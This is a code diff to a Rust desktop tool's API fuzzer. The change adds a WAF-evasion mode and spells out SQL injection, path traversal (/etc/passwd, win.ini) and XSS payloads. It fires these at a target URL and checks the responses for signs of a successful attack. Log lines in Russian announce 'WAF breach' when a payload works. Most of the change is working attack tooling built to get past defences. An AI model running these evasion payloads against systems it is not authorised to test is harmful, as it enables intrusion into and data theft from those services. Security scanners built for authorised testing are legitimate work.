@@ -63,21 +63,22 @@ pub struct FuzzFinding {
 #[tauri::command]
 pub async fn smart_fuzz_api(
     target_url: String,
-    mode: Option<String>,
+    use_evasion: bool,
     log_state: State<'_, crate::LogState>,
 ) -> Result<Vec<FuzzFinding>, String> {
-    crate::push_runtime_log(
-        &log_state,
-        format!("[SMART_FUZZ] start {} ({})", target_url, mode.clone().unwrap_or_else(|| "quick".to_string())),
-    );
-
-    let mode = mode.unwrap_or_else(|| "quick".to_string());
-
     let base_url = if !target_url.starts_with("http") {
         format!("http://{}", target_url)
     } else {
         target_url
     };
+
+    crate::push_runtime_log(
+        &log_state,
+        format!(
+            "🧪 Smart Fuzzer: цель {}, WAF Evasion: {}",
+            base_url, use_evasion
+        ),
+    );
 
     let client = Client::builder()
         .timeout(Duration::from_secs(5))
@@ -91,21 +92,23 @@ pub async fn smart_fuzz_api(
         "graphql".to_string(),
     ];
 
-    if mode.to_lowercase() != "quick" {
-        if let Ok(mut sw) = discover_swagger_endpoints(&client, &base_url).await {
-            endpoints.append(&mut sw);
-        }
+    if let Ok(mut sw) = discover_swagger_endpoints(&client, &base_url).await {
+        endpoints.append(&mut sw);
     }
 
     endpoints.sort();
     endpoints.dedup();
 
-    let mutations = vec![
-        ("sql_injection", "' OR 1=1--"),
-        ("path_traversal", "../../../etc/passwd"),
-        ("xss_probe", "<script>alert(1)</script>"),
-        ("cmd_injection", ";id"),
-        ("null_byte", "%00"),
+    let sqli_bases = ["' OR '1'='1", "1' ORDER BY 1--", "' UNION SELECT null--"];
+    let lfi_bases = [
+        "../../../etc/passwd",
+        "..\\..\\windows\\win.ini",
+        "....//....//etc/passwd",
+    ];
+    let xss_bases = [
+        "<script>alert(1)</script>",
+        "\" onmouseover=alert(1) x=\"",
+        "<img src=x onerror=alert(1)>",
     ];
 
     let mut findings = Vec::new();
@@ -121,45 +124,139 @@ pub async fn smart_fuzz_api(
             .await
             .ok()
             .and_then(|r| r.ok());
-        let baseline_body = if let Some(resp) = baseline {
-            resp.text().await.unwrap_or_default()
+        let baseline_len = if let Some(resp) = baseline {
+            resp.text().await.unwrap_or_default().len()
         } else {
-            String::new()
+            0
         };
-        let baseline_len = baseline_body.len();
 
-        for (kind, payload) in &mutations {
-            sleep(Duration::from_millis(220)).await;
-            let fuzz_url = format!("{}?q={}", url, urlencoding::encode(payload));
+        for base in sqli_bases {
+            let mut detected = false;
+            for payload in crate::fuzzer::generate_evasion_payloads(base, use_evasion) {
+                sleep(Duration::from_millis(180)).await;
+                let fuzz_url = format!(
+                    "{}?id={}&user={}",
+                    url,
+                    urlencoding::encode(&payload),
+                    urlencoding::encode(&payload)
+                );
 
-            let response = timeout(Duration::from_secs(6), client.get(&fuzz_url).send())
-                .await
-                .map_err(|_| "fuzz timeout".to_string())?
-                .map_err(|e| e.to_string())?;
-            let status = response.status().as_u16();
-            let body = response.text().await.unwrap_or_default();
-            let response_len = body.len();
+                if let Ok(Ok(response)) =
+                    timeout(Duration::from_secs(6), client.get(&fuzz_url).send()).await
+                {
+                    let status = response.status().as_u16();
+                    let body = response.text().await.unwrap_or_default();
+                    let response_len = body.len();
+                    let body_low = body.to_lowercase();
 
-            let body_low = body.to_lowercase();
-            let mut indicator = String::new();
-            if body.contains("root:x:0:0") {
-                indicator = "path traversal confirmed".into();
-            } else if body_low.contains("syntax error") || body_low.contains("mysql") {
-                indicator = "sql injection indicator".into();
-            } else if baseline_len > 0 && response_len.abs_diff(baseline_len) > (baseline_len / 2) {
-                indicator = "response length anomaly".into();
+                    if body_low.contains("sql syntax")
+                        || body_low.contains("mysql_fetch")
+                        || body_low.contains("ora-")
+                        || body_low.contains("syntax error")
+                        || body_low.contains("mysql")
+                    {
+                        crate::push_runtime_log(
+                            &log_state,
+                            format!("🚨 ПРОБИТИЕ WAF (SQLi): Пейлоад [{}] сработал!", payload),
+                        );
+                        findings.push(FuzzFinding {
+                            endpoint: ep.clone(),
+                            mutation_type: "sql_injection".to_string(),
+                            payload,
+                            status_code: status,
+                            indicator: "sql injection indicator".to_string(),
+                            baseline_len,
+                            response_len,
+                        });
+                        detected = true;
+                        break;
+                    }
+                }
             }
+            if detected {
+                break;
+            }
+        }
 
-            if !indicator.is_empty() {
-                findings.push(FuzzFinding {
-                    endpoint: ep.clone(),
-                    mutation_type: (*kind).to_string(),
-                    payload: (*payload).to_string(),
-                    status_code: status,
-                    indicator,
-                    baseline_len,
-                    response_len,
-                });
+        for base in lfi_bases {
+            let mut detected = false;
+            for payload in crate::fuzzer::generate_evasion_payloads(base, use_evasion) {
+                sleep(Duration::from_millis(180)).await;
+                let fuzz_url = format!("{}?file={}", url, urlencoding::encode(&payload));
+
+                if let Ok(Ok(response)) =
+                    timeout(Duration::from_secs(6), client.get(&fuzz_url).send()).await
+                {
+                    let status = response.status().as_u16();
+                    let body = response.text().await.unwrap_or_default();
+                    let response_len = body.len();
+                    let body_low = body.to_lowercase();
+
+                    if body.contains("root:x:0:0") || body_low.contains("[extensions]") {
+                        crate::push_runtime_log(
+                            &log_state,
+                            format!("🚨 ПРОБИТИЕ WAF (LFI): Пейлоад [{}] сработал!", payload),
+                        );
+                        findings.push(FuzzFinding {
+                            endpoint: ep.clone(),
+                            mutation_type: "path_traversal".to_string(),
+                            payload,
+                            status_code: status,
+                            indicator: "path traversal confirmed".to_string(),
+                            baseline_len,
+                            response_len,
+                        });
+                        detected = true;
+                        break;
+                    }
+                }
+            }
+            if detected {
+                break;
+            }
+        }
+
+        for base in xss_bases {
+            let mut detected = false;
+            for payload in crate::fuzzer::generate_evasion_payloads(base, use_evasion) {
+                sleep(Duration::from_millis(180)).await;
+                let fuzz_url = format!("{}?q={}", url, urlencoding::encode(&payload));
+
+                if let Ok(Ok(response)) =
+                    timeout(Duration::from_secs(6), client.get(&fuzz_url).send()).await
+                {
+                    let status = response.status().as_u16();
+                    let body = response.text().await.unwrap_or_default();
+                    let response_len = body.len();
+                    let body_low = body.to_lowercase();
+
+                    let reflected = body.contains(&payload)
+                        || body_low.contains("<script>alert(1)</script>")
+                        || body_low.contains("onerror=alert(1)")
+                        || (baseline_len > 0
+                            && response_len.abs_diff(baseline_len) > (baseline_len / 2));
+
+                    if reflected {
+                        crate::push_runtime_log(
+                            &log_state,
+                            format!("🚨 ПРОБИТИЕ WAF (XSS): Пейлоад [{}] сработал!", payload),
+                        );
+                        findings.push(FuzzFinding {
+                            endpoint: ep.clone(),
+                            mutation_type: "xss_probe".to_string(),
+                            payload,
+                            status_code: status,
+                            indicator: "xss/reflection indicator".to_string(),
+                            baseline_len,
+                            response_len,
+                        });
+                        detected = true;
+                        break;
+                    }
+                }
+            }
+            if detected {
+                break;
             }
         }
     }
@@ -168,6 +265,7 @@ pub async fn smart_fuzz_api(
         &log_state,
         format!("[SMART_FUZZ] findings {}", findings.len()),
     );
+
     Ok(findings)
 }
 
